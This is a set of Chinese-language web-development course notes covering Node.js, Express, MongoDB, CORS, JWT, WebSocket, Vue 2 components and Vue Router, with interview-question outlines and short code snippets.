# 三阶段

## 三阶段课程介绍
* 第一周：NodeJS
    * mySQL
    * mongoDB
* 第2-4周：Vue
* 第5-7周：React
* 第8周：小程序
* 第9周：混合开发


## day1-1

* NodeJS: ECMAScript
    > 在nodejs中没有DOM与BOM

* nodeJS多版本共存工具：nvm
    * nvm version   查看版本
    * nvm list      查看安装列表
    * nvm install   安装node版本
    * nvm uninstall 卸载已安装的node版本
    * nvm use       切换（使用）node版本

* 模块化：commonJS规范
    * 引入： require()
        > require查找顺序
    * 导出
        * module.exports（推荐）
        * exports

* 模块化开发规范
    * commonJS      nodejs采用的规范
    * ESModule      ES6推出的模块化规范
    * AMD           require.js框架支持的规范
    * CMD           sea.js框架支持的规范

* 模块化开发的优点
    1. 更新迭代更容易
    2. 分工更容易
    3. 复用

* 模块分类
    * 内置模块：nodejs自带的模块，可以直接引用
        * http
        * fs    filesystem
        * url
        * ....
        ```js
            const fs = require('fs');
        ```
    * 自定义模块：自己编写的符合commonJS规范的模块
        > 引用路径必须采用相对路径写法
        ```js
            const tools = require('./tools')
            
        ```
    * 第三方模块: 需要通过`npm install`安装（安装到node_modules），安装完成可直接引用
        ```js
            const gulp = require('gulp');
        ```
        

* 内置模块
    * http
    * path
    * url
    * fs

* mime类型
    > 每一种文件都对应有一个mime类型
    * text/plain    纯文本
    * text/html     html
    ...

## day1-2

### 复习
* Node: ECMAScript
    > 2009推出的服务端语言
* REPL
* 请求（requst）与响应（response）
    * url参数
    * 请求头与请求体
    * 响应头与响应体
* 模块化开发
    > 每个模块具有独立作用域，要使用模块中的变量，必须导出
    * 优点
        * 复用
        * 分工
        * 更新迭代
    * 规范
        * commonJS      NodeJS（后端，同步）
        * ESModule      ES6（前端，同步）
        * AMD           require.js（前端，异步）
        * CMD           sea.js（前端，异步）
    * 使用
        * 引入
            > 引入模块
            * commonJS: `require()`
            * ESMoudle: `import`
            * AMD/CMD: `require()`
        * 导出
            > 暴露接口
            * commonJS: `module.exports` 与 `exports`
            * ESModule: `export`
            * AMD/CMD: `define()`
    * 分类
        * 内置模块（原生模块）
        * 自定义模块
        * 第三方模块
* 静态资源服务器
    > 静态资源: 图片，js，css，html，字体等文件
    * 依赖模块
        * http
        * url
        * path
        * fs
    * mime类型
        > 服务告诉浏览响应的内容类型(响应头：Content-Type)

## 知识点

* express/koa
    * 中间件（middleware）
        * 定义：是一个函数
        * 使用中间件：`use([path],middleware...)`
            ```js
                app.use(function(){})
            ```
        * 分类
            * 内置中间件: express自带的中间件
                * express.static()
                * express.Router()
                * express.urlencoded()
                * express.json()
            * 自定义中间
                * 参数: `(req,res,next)=>{}`
            * 第三方中间
* 浏览器缓存
    * 强制缓存: 200 from cache
        > 缓存时间未过期,浏览器直接从本地获取
    * 协商缓存: 304
        > 缓存时间已过,浏览器发请求到服务器进行询问,如果服务的文件没有修改,则返回304,浏览器直接从本地获取(如果服务器文件有修改,服务器返回新的文件,状态码为200)
* RESTful规范
    > 要求使用不同的**请求类型**和**路径**实现相应的接口功能
    * 请求类型
        * get       查
        * post      增
        * put       改(全改)
        * patch     改(部分修改)
        * delete    删
* 路由
    * 获取请求参数
        * 动态路由: `req.params`
        * url参数: `req.query`
        * 请求体:
            > 通过请求体发送的数据,必须通过对应的中间件处理
            * x-www-form-urlencode: express.urlencode()
            * json: express.json
            * ...
    * 图片上传
        * multer

## day1-3

### 复习
* express / koa
    * 中间件Middleware
        * 内置中间件
        * 自定义中间件
        * 第三方中间件
    * 处理请求参数
        * url参数: req.query
        * 动态路由: req.params
        * 请求体: 
            * req.body
            * req.file
            * req.files
        * 请求头: req.get()
    * RESTful接口规范
        * 请求类型
        * 请求地址
    * 模块化路由
        * express.Router()
* 浏览器缓存
    * 协商缓存: 304
    * 强制缓存: 200 from cache
* formData  

* 学习要求
    * 查看文档的能力
        * 技术文档
        * 需求文档
    * 查找问题的能力
    * 解决问题的能力
    * 描述问题的能力

### 知识点
* 跨域
    * 为什么存在跨域限制
    * 解决方案
        * JSONP
        * CORS: Cross Origin Resource Sharing
            > 需要目标服务求授权（通过响应头）才能跨域访问数据
            * Access-Control-Allow-Origin
                * 单域名
                * `*`
            * Access-Control-Allow-Methods
            * Access-Control-Allow-Headers
        * 代理
            * http-proxy-middleware
        * iframe
        * postMessage
    * 复杂跨域
* 过滤器
    > 用于控制接口访问权限

* 页面渲染模式
    * 客户端渲染： BSR
        > 通过ajax请求数据到前端遍历生成html结构再渲染到页面（页面开始是空页面）
        * 优点
            * 局部刷新
            * 用户体验
            * 用户交互
    * 服务器渲染： SSR
        > 页面结构和内容在服务器生成后再返回给前端渲染
        * 优点
            * SEO搜索引擎优化
            * 速度较快
* 爬虫
    * 分析html结构
    * request
    * cheerio

* 作业：
    1. 爬取一个网站的数据到本地json文件（包括图片）
    2. 编写接口, 包含CRUD


## day 1-4

###  知识点
* mock数据
    > json-server
* nodeJS包管理工具
    * npm
        * npm install
        * npm uninstall
        * npm init
        * npm list
        * npm login
        * npm publish
    * cnmp
    * yarn
        * 安装： yarn add <模块名>
        * 安装依赖： yarn/yarn install
        * 卸载： yarn remove <模块名>
    * npm脚本
        * 添加添加：添加到package.json中的scripts
        * 运行脚本：
            * npm run <脚本名称>
            * yarn <脚本名称>

* mongoDB
    * 数据库
        * use NAME
        * show dbs
    * 集合
    * 文档
        * 增
            * insertOne(document)
            * insertMany([document1,document2,...])
        * 删
            * deleteOne(query)
            * deleteMany(query)
        * 改
            * updateOne(query,{$操作符:data})
            * updateMany(query,{$操作符:data})
        * 查
            * find(query)
            * findOne(query)
        * 过滤/排序
            * skip()        跳过
            * limit()       限制数量
            * sort()
        * 操作符
            * $set          修改为某个值
            * $inc          在原值的基础上修改
                * {$inc:{qty:1}}
            * $rename
                * {$rename:{qty:'view'}}
        * 查询条件
            * {username:'laoxie',age:18}
            * {$or:[{username:'laoxie'},{age:{$gt:18}}]}
    ```
        // 分页
        page=1,size=10
        mysql: select * from user order by age desc limit (page-1)*size,size
        mongo: db.user.find().sort({age:-1}).skip((page-1)*size).limit(size)

    ```

* 数据库对比
    ```
                    mysql               mongoDB
        数据库      database            database
        表/集合     table               collection
        数据        row                 document
    ```
* 在NodeJS中使用mySQL
    * 驱动（第三方模块）：mysql

* 在NodeJS中使用mongoDB
    * 驱动
        * mongodb
        * mongoose
    * 增删改查的封装
        * insert()
        * remove()
        * update()
        * find()

## day1-5

### 知识点
* UI框架
    * bootstrap
    * lay-ui
* 封装
    
* 统一前后端数据交互格式
    > json格式：{code:200,data:[],msg:'success'},{code:400,data:[],msg:'fail'},{code:200,data:[{},{}],msg:'success'}

* 加密解密
    > 为了数据安全
    * 加密类型
        * 单向加密
            * md5
            * sha1
            * sha256
            * sha512
        * 双向加密
            * 对称加密
                > 加密解密公用一把钥匙
                * 算法
            * 非对称加密
                * 公钥
                * 私钥
                * 算法：RSA
            * http(s): ssl

## day1-6

### 面试题
* 项目中的优化方式
    * 性能优化  PO
    * 用户体验优化 UEO
    * 搜索引擎优化 SEO
* 事件对象中target与currentTarget的区别
* 事件是如何传播的
    * 事件冒泡
    * 事件捕获
    * 事件源对象target

### 知识点

* token 令牌
    * 篡改
    * 有效期

* jsonwebtoken模块
    * 生成token: jwt.sign(data,key,options)
    * 校验token: jwt.verify(token,key)
* mongoDB的导入导出
    * mongoimport
    * mongoexport
* mongoDB备份恢复
    * mongodump
    * mongorestore
    

## day1-7

### 面试题
* getElementsByClassName()与querySelectorAll()区别
    * 原型链不同
    * NodeList与HTMLCollection（动态）
* 在项目中出现git代码冲突如何解决
    * code review
* 如何取消ajax请求
    ```js
        xhr = new XMLHttpRequest();
        xhr.onload = function(){}
        xhr.open('get',url,true)
        xhr.send()

        // 在合适的位置调用abort()
        // xhr.abort();
    ```
* Promise封装ajax请求
    ```js
        function request(callback){
            //return new Promise((resolve,reject)=>{
                let xhr = new XMLHttpRequest();
                xhr.onload = function(){
                    resolve(xhr.responseText)
                    callback(xhr.responseText)
                }
                xhr.open('get',url,true)
                xhr.send()

            //})
        }
        request().then(function(){}).catch().finally()
        await request();
        request(function(data){

        });
        arr.map(function(item,idx,arr){})
    ```
* js中的基本数据类型（值类型）
    * Number
    * String
    * Boolean
    * Null
    * Undefined
    * Symbol
    * BigInt    ES9推出新的数据类型
    
### 知识点
* ObjectId
* 联表查询：aggregation聚合查询
    > 需求：通过goods表中的addUser字段获取相应user表中的数据
    * 主表：goods
    * 关联表: user
    ```js
        col.aggregate([
            // {$match:{_id:id}}
            {
                $lookup:{
                    from:'user',
                    localField:'addUser',
                    foreignField:'username',
                    as:'user'
                }
            }
        ])

    ```
* 过滤字段：projection



* http(s)
    * 只能客户端主动发起请求，服务端被动响应
    * 短连接：请求并响应后与服务器断开连接
    * 同源策略限制

* WebSocket: 长连接(轮询)
    * 客户端（浏览器）
        > WebSocket
        * 连接
            ```js
                new WebSocket(url)
            ```
        * 方法
            * send()    给服务器发送消息
            * close()   断开与服务器的连接
        * 事件
            * open    当与服务器连接成功后触发该事件
            * close     当与服务器断开连接时触发该事件
            * message   当接收到服务器发来的消息时触发该事件
            * error
    * 服务端
        * 常用模块
            * ws
            * socket.io
        * 创建socket服务器
            * 服务器事件
                * connection    当客户端连接服务器时触发该事件，并传递client客户端对象
            * 客户端
                * 方法
                    * send()    发送消息给客户端
                * 事件
                    * message   接收到客户端消息时触发该事件
                    * close     当与客户端断开时触发该事件

## day2-1

### 面试题
* jsonp的原理
* 紧急bug修复流程:hotfix
    * 发版: main/master
    * 提bug
* script
    * type  text/javascript
    * src
    * defer
    * async

### 复习
* MongoDB
    * ObjectId
    * 联表查询
    * 字段过滤
        ```js
            // mongo
            db.user.find({},{password:0})

            // mongodb驱动
            db.collection('user').find({},{projection:{password:0}})
        ```
* websocket
    * 轮询
    * 心跳包:判断客户端是否存活(与服务器是否断开)
    * 服务端
        * 事件
        * 方法
    * 客户端
        * 事件
        * 方法

### 知识点
* Vue版本
    * 开发版与生产版
    * 完整版
        > 完整班 = 运行时版+编译器
    * 编译器
    * 运行时版
* 分层
    * MVC
    * MVVM
* Vue的使用
    ```js
        const vm = new Vue({
            // 关联视图层
            el:'#app',

            // 关联数据层
            data, 
        })

    ```
* 存储器属性（getter&setter）
    > 本身没有自己的值，一般用于代理其他属性
    ```js
        const user = {

            // getter: 读取属性时执行这个函数（可监听数据读取操作）
            get username(){
                console.log('getter')
                return nickname
            },

            // setter：修改属性时执行这个函数（可监听数据修改操作）
            set username(newValue){
                console.log('setter',newValue)
                nickname = newValue;
                // 操作视图
                username.innerText = newValue
            },
        }


        Object.defineProperty(user,'age',{
            // 值属性
            // configurable:true,
            // enumerable:true,
            // writable:false,
            // value:18

            // 存储器属性
            configurable:true,
            enumerable:true,
            get(){
                console.log('age getter')
                return age;
            },
            set(newValue){
                console.log('age setter')
                age = newValue;
            }
        })

    ```

* 数据绑定
    > 数据层中的数据写入视图层
    * 单向绑定
        > 原理：setter
        * {{}}              用于绑定到元素内容
        * v-text
        * v-html
            > 使用v-html显示内容一定要确保数据来源可靠，防止xss攻击（跨域脚本攻击）
        * v-bind:attr       用于绑定到元素属性
    * 双向绑定
        > 原理：单向+事件
        * v-model
            > 替代方案：v-bind:value + v-on:input

* 响应式属性
    > 原理：getter & setter
    Vue在实例化时会遍历数据层（data）中所有属性，并通过Object.defineProperty()方法把它们设置为存储器属性（getter & setter），并写入Vue实例

* 指令（自定义html属性）
    * v-bind:属性名
    * v-model
    * v-on:事件名
    * v-for
    * v-show    显示/隐藏(频繁显示隐藏的操作建议使用v-show)
    * v-if      销毁/创建
        * v-else
        * v-else-if
    * v-html
    * v-text

* 节点的频繁操作对页面性能的影响
    > 在web应用中，节点操作不可避免，但可以减少操作数量
    * 结论：节点操作越多性能越慢
    * Vue对节点的处理方案
        * 虚拟DOM
        * diff算法
    * 页面操作思维转变：节点操作 -> 数据操作
        
## day2-2

### 面试题
* 常见状态码有哪些
    * 200+
        * 200
        * 201
    * 300+
        * 301
        * 302
        * 304
    * 400+      客户端错误
        * 401
        * 402
        * 403
        * 404
    * 500+      服务端错误
* get、post、put、patch、delete请求类型的区别
* formData
    > form-urlencoded
    * 常用方法
        * set()/append()
        * get()/getAll()
        * delete()
        * has()
* computed与methods的区别

### 知识点
* Vue
    * 架构模式（分层）
        * MVC   
            * M: Model数据层
            * V: View视图层
            * C: Controller控制层
        * MVP
            * M: Model
            * V: View
            * P: Presenter
        * MVVM
            * M: Model
            * V: View
            * VM: ViewModel
* Vue的使用
    ```js
        const vm = new Vue({
            el:'#app',
            data:{
                a:10,
                b:20,
                c:{
                    type:'响应式属性'
                },
                d:['data1','data2']
            }
        })
        // vm.a;// 10
        // vm.b;//20
    ```
* 响应式属性
    > Vue在实例化时会遍历data中所有属性(包括子属性)，对象通过Object.defineProperty()方法把它们设置为存储器属性（getter & setter），数组写到特定的原型中，并写入Vue实例
    * 设置响应式属性的方式
        * 设置初始值
        * 对象属性：Vue.set(target,key,value) / vm.$set()
            > target对象不能是 Vue 实例，或者 Vue 实例的根数据对象
        * 数组变更方法
            > 原理：原型链，以下方法是Vue修改过的方法，在方法内处理视图更新
            * push()
            * pop()
            * unshift()
            * shift()
            * splice()
            * sort()
            * reverse()
    * 删除响应式属性
        * Vue.delete() / vm.$delete()

    * 搞懂以下问题：
        * 响应式属性的原理？
        * Vue是如何实现响应式属性的？

* 指令
    * v-on
        * 简写：`@`
        * 修饰符
        * 传参
    * 列表循环
        * v-for
        * v-for遍历对象
    * v-bind
        * 简写：`:`
        * class/style增强：支持对象与数组
            ```js
                <div class="list" v-bind:class="{box:true}">
            ```
        * 无参数绑定
        * 动态参数绑定

* 配置参数
    * el
    * data
    * methods
    * watch     监听属性
        > 可监听实例下所有属性，包括子属性
    * computed  计算属性
        > 原理：getter（默认） & setter
        * 特点：缓存
            > 当依**赖的数据**发生改变时，会重新计算，否则从缓存中获取

* ref
    > 给标签元素添加ref属性，指向标签对应的节点

## day2-3

### 面试题
* v-model替代方案
    * v-model = v-bind:value + v-on:input
    * v-model.lazy = v-bind:value + v-on:change
* 为什么在Vue中只有push,pop,shift,splice,sort等方法才具响应特性
    > 原型链继承
* 项目中常用的性能优化有哪些
    * 合并压缩
    * 服务器压缩
    * 懒加载
    * 图片优化
        * 品质优化
        * base64 编码
    * 事件委托
    * 虚拟 DOM
    * SSR
    * 按需加载
        > UI 框架按需加载
    * 防抖节流
    * 缓存

### 复习
* 配置参数
    * watch
        ```js
            data:{
                a:10,
                c:{
                    type:'letter'
                }
            },
            watch:{
                a:function(n,o){},
                'c.type':function(n,o){}
            }
        ```
    * computed
        > 缓存
    * 修饰符

### 知识点
* 实例属性
    * vm.$el
    * vm.$data/vm._data
    * vm.$options
    * vm.$refs
* 实例方法
    * vm.$set()
    * vm.$delete()
    * vm.$watch()
    * vm.$mount()
* Vue全局方法
    * Vue.set()
    * Vue.delete()
    * Vue.component()
* 封装的好处
    * 复用
    * 更新迭代
* 组件Component
    > 组件化开发，组件就是一个Vue的实例
    * 好处：开发效率
        * 代码复用
        * 更新迭代
        * 分工
    * 定义组件
        * 全局组件：Vue.component(name,options)
            > 可在任意地方使用
        * 局部组件: components配置参数 
            > 只能在定义局部组件所在的组件中使用
    * 组件要求
        * 只能有一个根元素
        * data只能是函数类型
        * 注册时可以是驼峰和kebab-case，使用时必须使用小写且不能与内置标签同名
    * 组件配置参数
        > 没有el, data为函数，其他与Vue实例基本一致
        * template
    * 组件层级结构
        * 父组件: vm.$parent
        * 子组件: vm.$children
        * 跟组件：vm.$root

        > 要求：
        * 学会从父组件获取子组件数据
        * 学会从子组件获取父组件数据

* 模块化开发
    * 规范
        * commonJS      nodeJS
        * ESModule      ES6
        * AMD           require.js
        * CMD           sea.js
    * 导入导出
        * commonJS  
            * require()
            * module.exports
        * ESModule
            * import
            * export
        * AMD/CMD
            * require()
            * define()
* ESModule
    > 模块对象：ESModule把每一个文件当作一个模块
    * 导入:import
        * 默认导入：导入模块对象中的default属性
        * 特定导入：导入模块对象中的特定属性
        ```js
            // xx为变量，url为模块地址（相对路径或绝对路径），必须为静态引入
            import xx from <url>

            import {xx} from <url>
        ```
    * 导出:export
        > export后只能跟：function、class、var、let、const、default、{}
        ```js
            export function getUser(){}
        ```
* Vue版本
    * 环境版本
        * 开发版本：development
        * 生产版本: production
    * 构建版本
        * 完整版
            > 完整版 = 运行时版+编译器
        * 运行时版：runtime
            > 删除编译器后的版本（编译器：把template的内容编译到render函数中）
* Vue单文件组件
    * html结构
    * js代码
    * css样式
* render渲染函数
    > render: createElement => vNode
    * el
    * template
    * render

## day2-4

### 面试题
* cookie,sessionStorage,localStorage大小限制，存满后如何处理
    * 大小
        * cookie: 4k
        * sessionStorage/localStorage: 5M
    * 满后如何处理
        * 划分多个子域名
        * webSQL        类似于mySQL
            ```js
                // 1. 创建/获取数据库（无则创建）
                const db = openDatabase('chart',1)

                // 2. 创建事务
                db.transaction(function (tx) {
                    // 3. CRUD
                    tx.executeSql(sql)
                }
            ```
        * indexDB       类似于MongoDB
            ```js
                // 1. 创建/获取数据库（无则创建）
                const db = indexedDB.open('goods',1)
                // 2. 创建集合
                db.createObjectStore('chart',{
                    keyPath:"id",
                    autoIncrement:true
                })
                // 3. 创建事务对象
                var t = db.transaction(["chart"],"readwrite");

                //4. 获取指定的集合 
                var store =  t.objectStore("chart");
                
                // CRUD
                store.add()
                store.delete()
                store.put()
                store.get()
                store.getAll()

                // 获取数据数量
                store.count()
            ```
### 知识点
* 组件通讯
    * 利用组件层级结构
    * 父->子: props
        > 传入的数据不可在子组件修改，在父组件修改会自动响应到子组件
        1. 父组件操作：给子组件添加属性并传递值
        2. 子组件操作：props配置参数接收传入属性
            > props中的属性会自动写入组件实例
    * 子->父：
        * 自定义事件
            > v-on:事件类型
            1. 父组件操作：给子组件自定义事件（v-on）,并设置父组件的事件处理函数
            2. 子组件操作：通过$emit()方法触发自定义事件，并传递参数
        * sync修饰符（用于简单数据的操作）
            1. 父组件操作：v-bind:qty.sync="qty"
                > sync修饰符会给组件绑定`update:qty`自定义事件
            2. 子组件操作：$emit('update:qty',10);
    * 兄弟->兄弟
        * prop + 自定义事件
            1. 兄弟->父组件
            2. 父组件->兄弟
        * 状态提升
            > 把数据提升到他们共同的父级
    * 深层次组件通讯
        * 逐层传递
            * 缺点：麻烦,结构变化会导致功能失效
        * 事件总线Bus
            * 自定义事件
            * 事件触发
    
    * 插槽slot
* 数据流
    > 与组件层级结构相关，遵循谁的数据谁修改的原则
    * 单向数据流
    * 双向数据流
* props
    * 接收：成为实例属性
    * 不接收：成为组件根元素的属性

* 解决powershell无法执行脚本的问题，
    > 电脑上启动 Window Powershell 时，默认情况下，其执行策略可能是Restricted（Restricted策略是不允许任何脚本执行的）
    * 查询当前执行策略
        ```bash
            get-executionpolicy
        ```
    * 解决问题方案
        > 更改执行策略 remotesigned（最好用管理员权限执行）
        ```bash
            set-executionpolicy remotesigned
        ```
    * Powershell执行策略
        > 设置执行策略格式：`Set-ExecutionPolicy <Policy name>`  
        * Restricted: 脚本不能运行(默认设置)
        * RemoteSigned: 在本地创建的脚本可以运行，网上下载的脚本无法运行(拥有数字证书签名例外)
        * AllSigned: 仅当脚本由受信任的发布者签名时才能运行
        * Unrestricted: 允许所有脚本运行

## day2-5

### 面试题
* 事件绑定方式
    * on+事件类型=事件处理函数
    * addEventListener(事件类型,事件处理函数,是否捕获)
* Promise的理解
    * 状态
        * Pending   初始状态
        * Fulfilled 解决/完成状态
        * Rejected  失败状态
    ```js
        $.ajax()
        function request(url,callback){
            let result
            return new Promise((resolve,reject)=>{
                const xhr = new XMLHttpRequest()
                xhr.onload = function(){
                    // xhr.responseText
                    result = xhr.responseText
                    // callback(xhr.responseText)
                    resolve(xhr.responseText)
                    reject()
                }
                xhr.open('get',url,true)
                xhr.send()

            })
        }

        const result = request('xxx.php',function(){})
        const result = request('xxx.php').then(()=>{})
        (async ()=>{
            const result = await request('xxx.php')
            console.log('result',result);
        })()
    ```
* 如何调试js代码
    > 如何提高查找问题、解决问题的能力
    * `can not read the property b of undefined`
    * `can not resovle module xxx`
        * 重装: npm install xxx
        * 卸载: npm uninstall xxx
        * 清缓存：npm cache clean -f
        * 指定版本安装：npm install xxx@版本
    ```js
        list.b.x
    ```
    * 断点调试
* 版本：2.6.11
    * 大版本
    * 小版本
    * 补丁


### 复习
* 组件通讯
    * 父->子：props
    * 子->父：自定义事件
    * 兄弟->兄弟：状态提升
    * 深层级组件：
        * 逐层传递
        * 事件总线Bus
            * $on()
            * $emit()
            * $off()
    * 插槽slot
        > 标签内容与组件间的通讯，让用户可定制组件内容
        * 组件外->组件内：插槽
            * 默认插槽：显示**组件标签**的内容
                ```js
                    <slot/>
                ```
            * 具名插槽：给`<slot/>`命名
                ```js
                    <slot name="xxx" />

                    // 定义传入命名插槽的内容：v-slot
                    <template v-slot:xxx>

                    </template>
                ```
        * 组件内->组件外：作用域插槽
            ```js
                <slot name="footer" a="10" :b="20" />

                // #组件外
                <template v-slot:footer="scope"></template>
                <template v-slot:default="scope"></template>
            ```
* 组件生命周期
    > 组件在创建到销毁的过程，在这个过程中会自动执行一些钩子函数（生命周期函数）
    * 创建阶段
        * beforeCreate()
        * **设置响应式属性并写入实例**
        * created()
    * 挂载阶段
        * beforeMount()
        * **数据挂载到视图**
        * mounted()
    * 更新阶段
        * beforeUpdate()
        * **diff算法&key** 
        * updated()
    * 销毁阶段
        * beforeDestroy()
        * **清理它与其它实例的连接，解绑它的全部指令及事件监听器**
        * destroyed()
    
    * 搞懂两个问题
        1. 每个生命周期函数的执行过程
        2. 每个生命周期函数适合做什么操作
    
## day3-1

### 面试题
* 父子组件生命周期执行过程

### 复习
* 插槽：`<slot/>`
    * 默认插槽
        > 默认插槽的名字为default
        ```js
            <slot/>
        ```
    * 命名插槽: `v-slot:name`
        ```js
            // 组件<mytable/>内部代码
            <slot name="footer"/>
            <tr v-for="(item,idx) in datalist">
                <slot name="tr" :item="item" :idx="idx" />
            </tr>

            // 使用组件
            <mytable :data="datalist">
                <h1>插槽内容</h1>
                <template v-slot:footer>
                    <h2>命名插槽内容</h2>
                </template>
            </mytable>
        ```
    * 作用域插槽: `v-slot:name="scope"`
        ```js
            <mytable :data="datalist">
                <template v-slot:tr="scope">
                   <td>{{item.xxx}}</td>
                   <td>{{item.xxx}}</td>
                   <td>{{scope.idx}}</td>
                </template>
            </mytable>
        ```

* 组件生命周期
    > 搞懂Vue在每个阶段做了什么
    * 创建阶段
    * 挂载阶段
    * 更新阶段
        * 虚拟DOM
        * diff算法：对比前后虚拟DOM，找出差异项
        * key
    * 销毁阶段

### 知识点
* 自定义组件：创建一个标签、
    * 全局组件：Vue.component()
    * 局部组件: components
* 自定义指令：创建一个属性
    * 定义
        * 全局指令：Vue.directive(name,options)
        * 局部指令: directives
        ```js
            Vue.directive('baseurl',{
                bind(el,binding,vNode){},   //初始化时执行（默认）
                inserted(){},   // 指令所在的元素插入页面时执行
                update(){},     // 所在模板更新时执行
                componentUpdated(){}, //所在模板完成一次更新周期时调用
                unbind(){}, //指令与元素解绑时执行
            })

        ```
    * 使用
        > 指令完整格式：v-name:参数.修饰符="值"
        ```js
            <div v-baseurl="http://laoxie.com" />
        ```
* 过滤器
    * 定义
        * 全局过滤器: Vue.filter(name,definition)
        * 局部过滤器: filters:{name:definition}
            ```js
                Vue.filter('uppercase',function(value){})
            ```
    * 使用: |
        > 过滤器可以用在: 双花括号，v-bind
        ```js
            <p v-bind:username="username | uppercase">{{username | uppercase}}
        ```

* 正则零宽断言
    > 正则表达式分先行断言(lookahead)和后行断言(lookbehind)，先行断言和后行断言个2种，一共有4种形式
    * (?=pattern) ：零宽正向先行断言
        > 如果某个字符后面能匹配pattern，则匹配该字符
    * (?!pattern) ： 零宽负向先行断言
        > 如果某个字符后面不能匹配pattern，则匹配该字符
    * (?<=pattern)： 零宽正向后行断言
        > 如果某个字符前面能匹配pattern，则匹配该字符
    * (?<!pattern) ：零宽负向后行断言
        > 如果某个字符前面不能匹配pattern，则匹配该字符

* mixin混入
    > 提取组件的公共配置
    * 定义
        * 全局: Vue.mixin(options)
            > 由于全局组件影响太大，在实际开发中不常用
        * 局部: `mixins:[]`
    
## day3-2

### 面试题
* 如何实现点击图片不同的位置跳转到不同的页面
    * 利用定位在图片上覆盖标签
    * event.offsetX,event.offsetY
    * map area
        * 网页三剑客：dreamweaver+flash+firwork
        * AS: action script
* rem/vh/vw布局的缺陷
    > 缩放布局
    * 如何做适配
        * 弹性盒
        * 百分比
        * 媒体查询
        * 设备判断
        * ...
    
### 复习
* 组件Component
* 指令Directive
* 过滤器Filter
* 混入Mixin
* 依赖注入Provide/Inject
* 插件Plugin
    * 定义
        * 对象：提供install方法，自动传入Vue作为函数参数
        * 函数
        ```js
            const myPlugin = function(Vue){
                // 在这插件可以扩展任何东西，比如：自定义组件，指令，过滤器，混入等等
            }
        ```
    * 使用
        Vue.use()
### 知识点
* VueRouter
    > 作为插件增Vue的功能，路由：根据不同的浏览器地址显示不同的内容（单页面应用：根据hash值的不同显然不同的内容，页面不会刷新与跳转）
    * 安装
        ```bash
            # 传统方式
            npm i vue-router

            # vueCLI（自动配置和引用）
            vue add router
        ```
    * 使用
        1. 安装并引入vue-router
        2. 安装插件vue-router
        3. 实例化router并配置参数
            > routes
        4. 把router实例注入到vue实例中
        5. 在组件中使用

    * 路由配置
        * routes    路由规则
        * mode      路由模式
            * hash(默认)    hash路由（特点：url地址有一个#）
            * history       
    * 路由显示: `<router-view/>`
    * 路由跳转（导航）
        > 通过name或path进行跳转
        * 声明式导航：`<router-link/>`
        * 编程式导航：利用js代码实现跳转
            * $route    当前路由信息对象
            * $router   路由实例
                * push()    跳转并生成浏览记录
                * replace() 跳转但不生产浏览记录
                * back()
                * forward()
                * go()

* 单页面应用：SPA（Single Page Application）
* 多页面应用：MPA（Multiple Page Application）

* UI框架（组件库）
    > UI组件库都是通过插件的形式实现的
    * Element            饿了么出品
    * Ant Design of Vue  阿里出品
    * iView              腾讯出品        
    * VantUI             有赞出品
    * ...



## day3-3

### 复习
* 路由：vue-router
    * 使用步骤
        1. 安装与引入
        2. 使用（安装）
        3. 实例化并配置参数（路由规则）
            * routes
        4. 注入根实例
        5. 使用
            * 如何显示内容：`<router-view/>`
            * 如何跳转
                * 声明式导航：`<router-link/>`
                    * to
                    * tag
                    * active-class
                    * replace
                    * event
                * 编程式导航
                    * $route
                    * $router
                        * push()
                        * replace()
                        * back()
                        * forward()
                        * go()
* 动态组件
    * `<router-view/>`

### 知识点
* scoped局部样式
    > 原理：给当前组件添加data-v-[hash]属性，然后通过属性选择器实现局部样式
* 路由传参
    * 动态路由
        1. 配置动态路由
        2. 接收：$route.params


## day3-4

### 面试题 
* RESTful接口规范的理解
* Vue实例化时对el,template,render几个配置参数的处理过程
* attr与prop的区别
    > attr: attribute为html属性，prop: property为节点属性
    * jquery：
        * attr()    设置html属性
        * prop()    设置节点属性
    * 原生：
        * setAttribute() 设置html属性
        * 点语法：设置节点属性
    * 公共属性与私有属性会相互影响
* 如何监听一个属性是否被修改
    > getter&setter
    * 原生：
        ```js
            const user = {
                // 值属性
                username:'jingjing',

                // 存储器属性
                get age(){
                    
                },
                set age(){

                }
            }
            Object.defineProperty(target,key,descriptor);// discriptor属性特性
            Object.defineProperties()
            user.age;
            user.age = 20;
        ```
    * Vue中如何设置响应式属性
        * 数据初始化
        * Vue.set(target,key,val)/vm.$set()
           > target不能是vm实例，也不能是数据根对象(vm.$data)
        * 数组变更方法
* 如何确认数组中是否包含某个值
    * indexOf()
    * includes()
    * find()
    * findIndex()
* 在不改变源码的基础上如何在一个点击事件之前执行你的代码
    * 利用事件捕获

### 知识点
* 路由传参
    * params
        > 获取方式：$route.params，刷新页面后参数消失（动态路由例外）
        * 动态路由
            > params方式给动态路由传参，只支持name方式跳转
    * query: url参数
        > 获取方式：$route.query，刷新页面后不会消失
    * props: 定义时传参
        * Object
        * Function
        * Boolean   把route.params作为组件的props属性
* 数据持久化
    > 刷新后参数依然存在
* 监听动态路由变化
    * watch监听$route属性
    * 路由守卫（路由钩子函数）: beforeRouteUpdate
* 路由守卫
    * 分类
        * 全局守卫
            > 是路由实例的方法，写在路由配置文件中
            * router.beforeEach(fn)
            * router.afterEach(fn)
                * to
                * from
            * router.resolve(fn)
        * 路由独享的守卫
            > 写在路由配
            * beforeEnter()
        * 组件内的守卫
            > 写在组件中
            * beforeRouteEnter()
            * beforeRouteUpdate()
            * beforeRouteLeave()
    * 路由守卫参数
        * to        目标路由信息（$route）
        * from      来源路由信息（$route）
        * next      是一个函数，用于进入下一个步骤
    * 路由执行步骤
        1. 导航被触发
        2. 在**失活组件**里调用beforeRouteLeave离开守卫。
        3. 调用全局的 beforeEach 守卫。
            4. 在**重用的组件**里调用 beforeRouteUpdate 守卫 (2.2+)。
                > 重用组件路由切换进入到这步后，直接执行第7步（忽略2、4、5、6）
        4. 在路由配置里调用 beforeEnter。
        5. 解析异步路由组件。
        6. 在被**激活组件**里调用 beforeRouteEnter。
        7. 调用全局的 beforeResolve 守卫 (2.5+)。
        8. 导航被确认。
        9. 调用全局的 afterEach 钩子。
        10. 触发 DOM 更新。
    * 应用
        * 利用路由守卫+token实现页面访问权限控制
        * 动态配置路由实现页面访问权限控制
            * router.addRoute()
            * router.addRoutes()
* 嵌套路由
    * 配置
        * children
    * 使用
        * 嵌套<router-view/>
* 命名视图
    > 给<router-view/>组件添加name属性，定义路由时要使用`components`配置
    * compnents与component不能同时使用

## day3-5

### 面试题
* 动态路由面嵌套路由的区别

### 知识点
* VueX使用步骤
    1. 安装模块并引入
        ```bash
            npm install vuex
        ```
    2. 安装插件
        ```js
            Vue.use(Vuex);
        ```
    3. 实例化
